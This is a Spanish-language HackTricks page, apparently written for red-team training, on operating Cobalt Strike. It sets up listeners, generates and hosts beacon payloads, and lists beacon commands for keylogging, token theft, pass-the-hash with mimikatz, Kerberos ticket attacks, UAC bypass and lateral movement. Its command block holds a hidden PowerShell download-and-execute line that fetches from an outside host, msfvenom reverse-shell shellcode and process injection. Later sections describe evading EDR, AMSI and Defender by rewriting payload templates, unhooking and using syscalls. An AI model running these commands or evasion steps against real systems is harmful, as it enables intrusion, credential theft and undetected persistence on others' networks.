# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` luego puedes seleccionar dónde escuchar, qué tipo de beacon usar (http, dns, smb...) y más.

### Peer2Peer Listeners

Los beacons de estos listeners no necesitan comunicarse directamente con el C2; pueden comunicarse con él a través de otros beacons.

`Cobalt Strike -> Listeners -> Add/Edit` luego debes seleccionar los beacons TCP o SMB

* El **TCP beacon establecerá un listener en el puerto seleccionado**. Para conectarte a un TCP beacon, usa el comando `connect <ip> <port>` desde otro beacon
* El **smb beacon escuchará en un pipename con el nombre seleccionado**. Para conectarte a un SMB beacon, debes usar el comando `link [target] [pipe]`.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** para archivos HTA
* **`MS Office Macro`** para un documento de Office con una macro
* **`Windows Executable`** para un .exe, .dll o service .exe
* **`Windows Executable (S)`** para un .exe, .dll o service .exe **stageless** (mejor stageless que staged, menos IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Esto generará un script/ejecutable para descargar el beacon desde Cobalt Strike en formatos como: bitsadmin, exe, powershell y python

#### Host Payloads

Si ya tienes el archivo que quieres alojar en un servidor web, ve a `Attacks -> Web Drive-by -> Host File` y selecciona el archivo que quieres alojar y la configuración del servidor web.

### Beacon Options

<details>
<summary>Beacon options and commands</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket on the attacker machine from a PowerShell session and load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump an interesting ticket by LUID
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On the Metasploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Custom implants / Linux Beacons

- Un custom agent solo necesita hablar el protocolo HTTP/S del Team Server de Cobalt Strike (perfil malleable C2 predeterminado) para registrarse, hacer check-in y recibir tareas. Implementa las mismas URI, cabeceras y criptografía de metadata definidas en el perfil para reutilizar la interfaz de Cobalt Strike para asignar tareas y recibir resultados.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Un Aggressor Script (por ejemplo, `CustomBeacon.cna`) puede envolver la generación de payloads para el beacon no Windows, de modo que los operadores puedan seleccionar el listener y generar payloads ELF directamente desde la GUI.
- Ejemplos de task handlers de Linux expuestos al Team Server: `sleep`, `cd`, `pwd`, `shell` (ejecutar comandos arbitrarios), `ls`, `upload`, `download` y `exit`. Estos se asignan a los task IDs esperados por el Team Server y deben implementarse en el servidor para devolver los resultados en el formato adecuado.
- El soporte de BOF en Linux puede añadirse cargando Beacon Object Files en el mismo proceso mediante [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (también admite BOF de estilo Outflank), lo que permite ejecutar post-exploitation modular dentro del contexto y los privilegios del implant sin crear nuevos procesos.<sup>[[2]](#references)[[3]](#references)</sup>
- Integra un SOCKS handler en el custom beacon para mantener la paridad de pivoting con los Windows Beacons: cuando el operador ejecute `socks <port>`, el implant debe abrir un proxy local para enrutar las herramientas del operador a través del host Linux comprometido hacia las redes internas.

## Opsec

### Execute-Assembly

**`execute-assembly`** utiliza un **sacrificial process** mediante remote process injection para ejecutar el programa indicado. Esto es muy ruidoso, ya que para inyectar en un proceso se utilizan ciertas API de Windows que todos los EDR comprueban. Sin embargo, existen algunas herramientas custom que pueden utilizarse para cargar algo en el mismo proceso:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- En Cobalt Strike también puedes utilizar BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

El Aggressor Script `https://github.com/outflanknl/HelpColor` creará el comando `helpx` en Cobalt Strike, que añadirá colores a los comandos para indicar si son BOF (verde), si son Frok&Run (amarillo) o similares, o si son ProcessExecution, injection o similares (rojo). Esto ayuda a saber qué comandos son más sigilosos.

### Act as the user

Puedes comprobar eventos como `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Security EID 4624 - Comprueba todos los inicios de sesión interactivos para conocer el horario habitual de actividad.
- System EID 12,13 - Comprueba la frecuencia de apagado, inicio y suspensión.
- Security EID 4624/4625 - Comprueba los intentos NTLM entrantes válidos y no válidos.
- Security EID 4648 - Este evento se crea cuando se utilizan credenciales en texto plano para iniciar sesión. Si lo genera un proceso, es posible que el binario contenga las credenciales en texto claro en un archivo de configuración o dentro del código.

Al utilizar `jump` desde Cobalt Strike, normalmente es mejor utilizar el método `wmi_msbuild` para que el nuevo proceso parezca más legítimo.

### Use computer accounts

Es habitual que los defensores comprueben comportamientos extraños generados por usuarios y **excluyan las service accounts y computer accounts, como `*$`, de su monitorización**. Puedes utilizar estas cuentas para realizar lateral movement o privilege escalation.

### Use stageless payloads

Los stageless payloads son menos ruidosos que los staged, porque no necesitan descargar una segunda stage desde el servidor C2. Esto significa que no generan tráfico de red después de la conexión inicial, por lo que es menos probable que sean detectados por defensas basadas en red.

### Tokens & Token Store

Ten cuidado al robar o generar tokens, ya que un EDR puede enumerar los thread tokens y detectar un **token perteneciente a otro usuario** o incluso a SYSTEM dentro del proceso.

Esto permite almacenar tokens **por beacon**, de modo que no sea necesario robar el mismo token una y otra vez. Es útil para lateral movement o cuando necesitas utilizar varias veces un token robado:

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- token-store show
- `token-store use <id>`
- `token-store remove <id>`
- token-store remove-all

Al realizar lateral movement, normalmente es mejor **robar un token que generar uno nuevo** o realizar un ataque pass the hash.

### Guardrails

Cobalt Strike dispone de una función llamada **Guardrails** que ayuda a evitar el uso de determinados comandos o acciones que podrían ser detectados por los defensores. Los Guardrails pueden configurarse para bloquear comandos específicos, como `make_token`, `jump`, `remote-exec` y otros utilizados habitualmente para lateral movement o privilege escalation.

Además, el repositorio [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) también contiene algunas comprobaciones e ideas que podrías considerar antes de ejecutar un payload.

### Tickets encryption

En un AD, ten cuidado con el cifrado de los tickets. De forma predeterminada, algunas herramientas utilizan cifrado RC4 para los tickets Kerberos, que es menos seguro que el cifrado AES, y los entornos actualizados normalmente utilizan AES de forma predeterminada. Los defensores que monitorizan algoritmos de cifrado débiles pueden detectar esto.

### Avoid Defaults

Al utilizar Cobalt Stricke, de forma predeterminada los SMB pipes tendrán los nombres `msagent_####` y `"status_####"`. Cambia esos nombres. Es posible comprobar los nombres de los pipes existentes desde Cobal Strike con el comando: `ls \\.\pipe\`

Además, en las sesiones SSH se crea un pipe llamado `\\.\pipe\postex_ssh_####`. Cámbialo con `set ssh_pipename "<new_name>";`.

Asimismo, en los ataques de post-exploitation, los pipes `\\.\pipe\postex_####` pueden modificarse con `set pipename "<new_name>"`.

En los perfiles de Cobalt Strike también puedes modificar aspectos como:

- Evitar utilizar `rwx`
- Cómo funciona el comportamiento de process injection (qué API se utilizarán) en el bloque `process-inject {...}`
- Cómo funciona "fork and run" en el bloque `post-ex {…}`
- El tiempo de sleep
- El tamaño máximo de los binarios que se cargarán en memoria
- El memory footprint y el contenido de la DLL con el bloque `stage {...}`
- El tráfico de red

### Bypass memory scanning

Algunos EDR escanean la memoria en busca de firmas conocidas de malware. Cobalt Strike permite modificar la función `sleep_mask` como un BOF que podrá cifrar el backdoor en memoria.

### Noisy proc injections

Al inyectar código en un proceso, esto suele ser muy ruidoso, porque **normalmente ningún proceso legítimo realiza esta acción y las formas de hacerlo son muy limitadas**. Por lo tanto, podría ser detectado por sistemas de detección basados en el comportamiento. Además, los EDR también podrían detectarlo al escanear la red en busca de **threads que contengan código que no se encuentre en disco** (aunque procesos como los navegadores que utilizan JIT presentan esto habitualmente). Ejemplo: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

Al crear un nuevo proceso, es importante **mantener una relación parent-child habitual** entre los procesos para evitar la detección. Si svchost.exec ejecuta iexplorer.exe, parecerá sospechoso, ya que svchost.exe no es el proceso padre de iexplorer.exe en un entorno Windows normal.

Cuando se crea un nuevo beacon en Cobalt Strike, de forma predeterminada se crea un proceso que utiliza **`rundll32.exe`** para ejecutar el nuevo listener. Esto no es muy sigiloso y los EDR pueden detectarlo fácilmente. Además, `rundll32.exe` se ejecuta sin argumentos, lo que lo hace aún más sospechoso.

Con el siguiente comando de Cobalt Strike, puedes especificar un proceso diferente para crear el nuevo beacon, haciendo que sea menos detectable:
```bash
spawnto x86 svchost.exe
```
También puedes cambiar esta configuración **`spawnto_x86` y `spawnto_x64`** en un profile.

### Proxying el tráfico de los atacantes

A veces los atacantes necesitarán poder ejecutar tools localmente, incluso en máquinas Linux, y hacer que el tráfico de las víctimas llegue a la tool (por ejemplo, NTLM relay).

Además, a veces, para realizar un ataque pass-the.hash o pass-the-ticket, es más sigiloso que el atacante **añada este hash o ticket a su propio proceso LSASS** localmente y después haga pivoting desde él, en lugar de modificar un proceso LSASS de una máquina víctima.

Sin embargo, debes tener **cuidado con el tráfico generado**, ya que podrías estar enviando tráfico poco común (¿Kerberos?) desde tu proceso backdoor. Para esto, podrías hacer pivoting a un proceso del navegador (aunque podrían detectarte al inyectarte en un proceso, así que piensa en una forma sigilosa de hacerlo).


### Evitando los AV

#### AV/AMSI/ETW Bypass

Consulta la página:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Normalmente, en `/opt/cobaltstrike/artifact-kit`, puedes encontrar el código y las plantillas precompiladas (en `/src-common`) de los payloads que Cobalt Strike utilizará para generar los beacons binarios.

Usando [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) con el backdoor generado (o simplemente con la plantilla compilada), puedes encontrar qué hace que Defender se active. Normalmente es una cadena. Por lo tanto, solo tienes que modificar el código que genera el backdoor para que esa cadena no aparezca en el binario final.

Después de modificar el código, ejecuta `./build.sh` desde el mismo directorio y copia la carpeta `dist-pipe/` al cliente Windows en `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
No olvides cargar el script agresivo `dist-pipe\artifact.cna` para indicar a Cobalt Strike que use los recursos del disco que queremos y no los que ya están cargados.

#### Kit de recursos

La carpeta ResourceKit contiene las plantillas para los payloads basados en scripts de Cobalt Strike, incluidos PowerShell, VBA y HTA.

Al usar [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) con las plantillas, puedes descubrir qué es lo que a Defender (AMSI en este caso) no le gusta y modificarlo:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Modificando las líneas detectadas, se puede generar una plantilla que no será detectada.

No olvides cargar el script agresivo `ResourceKit\resources.cna` para indicar a Cobalt Strike que use los recursos del disco que queremos y no los que ya están cargados.

#### Function hooks | Syscall

El hooking de funciones es un método muy común de los ERDs para detectar actividad maliciosa. Cobalt Strike permite evadir estos hooks mediante **syscalls** en lugar de las llamadas estándar a la API de Windows usando la configuración **`None`**, usar la versión `Nt*` de una función con la configuración **`Direct``, o simplemente saltar sobre la función `Nt*` con la opción **`Indirect`** en el perfil malleable. Dependiendo del sistema, una opción puede ser más sigilosa que otra.

Esto se puede configurar en el perfil o mediante el comando **`syscall-method`**.

Sin embargo, esto también puede ser ruidoso.

Una opción que ofrece Cobalt Strike para evadir los hooks de funciones es eliminarlos con: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

También puedes comprobar qué funciones están hookeadas con [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) o [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Varios comandos de Cobalt Strike</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## References

- [1] [Cobalt Strike Linux Beacon (PoC de implant personalizado)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Plantilla de nix BOF de Outflank](https://github.com/outflanknl/nix_bof_template)
- [4] [Análisis de Unit42 del cifrado de metadatos de Cobalt Strike](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [Diario de SANS ISC sobre el tráfico de Cobalt Strike](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)
{{#include ../banners/hacktricks-training.md}}
